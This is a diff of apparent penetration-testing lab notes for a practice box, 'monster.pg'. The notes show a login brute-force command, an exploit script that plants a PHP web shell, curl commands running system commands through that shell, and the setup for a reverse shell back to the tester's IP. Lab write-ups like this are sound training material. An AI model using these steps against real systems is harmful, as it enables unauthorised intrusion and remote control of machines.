@@ -1,6 +1,6 @@
 # ip: 192.168.243.180
 
-# my: 192.168.45.208/24
+# my: 192.168.45.156
 
 # reconnaissance
 
@@ -240,4 +240,48 @@ check fail message
 
 ![](image_25.png)
 
-> python3 bruteforce_csrf_php.py --url http://monster.pg/blog/users/login/ --users /usr/share/seclists/Usernames/Names/names.txt --passwords words.txt -T 10
+> python3 bruteforce_csrf_php.py --url http://monster.pg/blog/users/login/ --users /usr/share
+> /seclists/Usernames/Names/names.txt --passwords words.txt -T 10
+
+![](image_27.png)
+
+username: admin
+email: wazowski@monster.pg
+registered: 22.2.2022
+
+> python3 52038.py http://monster.pg/blog admin wazowski
+
+![](image_28.png)
+
+success
+
+> curl "http://monster.pg/blog/public/themes/default/zpsyc.chunk.php?cmd=whoami"
+> mike-pc\mike
+
+![](image_29.png)
+
+> curl "http://monster.pg/blog/public/themes/default/zpsyc.chunk.php?cmd=whoami%20/priv"
+
+Privilege Name Description State
+============================= ==================================== ========
+SeShutdownPrivilege Shut down the system Disabled
+SeChangeNotifyPrivilege Bypass traverse checking Enabled
+SeUndockPrivilege Remove computer from docking station Disabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+SeTimeZonePrivilege Change the time zone Disabled
+
+## reverse shell
+
+my ip: 192.168.45.156
+
+> nc -lvnp 1234
+
+https://www.revshells.com/
+
+> curl 'http://monster.pg/blog/public/themes/default/zpsyc.chunk.php?cmd='
+
+> python3 -m http.server 80
+
+> vim reverse.ps1
+
+![](image_30.png)
